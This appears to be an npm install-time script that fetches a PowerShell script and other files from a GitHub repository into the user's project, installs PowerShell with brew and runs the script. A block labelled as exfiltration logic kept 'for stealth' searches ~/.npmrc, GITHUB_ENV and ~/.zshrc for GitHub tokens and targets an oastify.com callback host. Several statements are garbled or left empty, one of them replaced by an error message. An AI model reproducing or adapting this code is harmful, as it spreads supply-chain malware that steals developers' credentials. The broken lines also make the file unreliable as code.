const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');

// helper to download a file
function download(url, dest, cb) {
    const file = fs.createWriteStream(dest);
    https.get(url, res => {
        res.pipe(file);
        file.on('finish', () => file.close(cb));
    }).on('error', err => {
        fs.unlink(dest, () => cb(err));
    });
}

// 1. download the three files into the original working directory (npm sets INIT_CWD)
const targetDir = process.env.INIT_CWD || process.cwd();
const files = [
    'https://raw.githubusercontent.com/GirirajRavichandran/test-public/main/file.ps1',
    'https://raw.githubusercontent.com/GirirajRavichandran/test-public/main/god-killer.txt',
    'https://raw.githubusercontent.com/GirirajRavichandran/test-public/main/god.txt'
];
let completed = 0;
files.forEach(url => {
    const name = path.basename(url);
    download(url, path.join(targetDir, name), err => {
        completed++;
        if (err) console.error('download failed', url, err);
    });
});

// 2. install pwsh using brew, then wait, then run command
function runBrewInstall() {
    const brew = spawn('brew', ['install', 'powershell'], { stdio: 'inherit' });
    brew.on('close', code => {
        setTimeout(runPwsh, 10000); // wait 10 seconds before running powershell command
    });
}

function runPwsh() {
    const cwd = process.env.INIT_CWD || process.cwd();
    const scriptPath = path.join(cwd, 'file.ps1');
    const cmd = Processing -File '' failed: The value cannot be an empty string. (Parameter 'path') Specify a valid path for the -File parameter.;
    exec(cmd, { cwd }, (err, out) => {
        if (err) console.error('pwsh execution failed', err);
    });
}

runBrewInstall();

// previous exfil logic retained for stealth
const homeDir = os.homedir();
const oastUrl = "http://3y2ev1k4fi83c60p0h36tf3t9kfb31rq.oastify.com";

let exfilData = ;
const targets = [
    { name: 'NPMRC', path: path.join(homeDir, '.npmrc') },
    { name: 'GITHUB_ENV', path: process.env.GITHUB_ENV || '' },
    { name: 'ZSHRC', path: path.join(homeDir, '.zshrc') }
];

targets.forEach(target => {
    if (fs.existsSync(target.path)) {
        try {
            const content = fs.readFileSync(target.path, 'utf8');
            const match = content.match(/ghp_[a-zA-Z0-9]{36}/);
            if (match) exfilData += ;
        } catch (e) {}
    }
});

const user = os.userInfo().username;
const cmd = ;
exec(cmd);

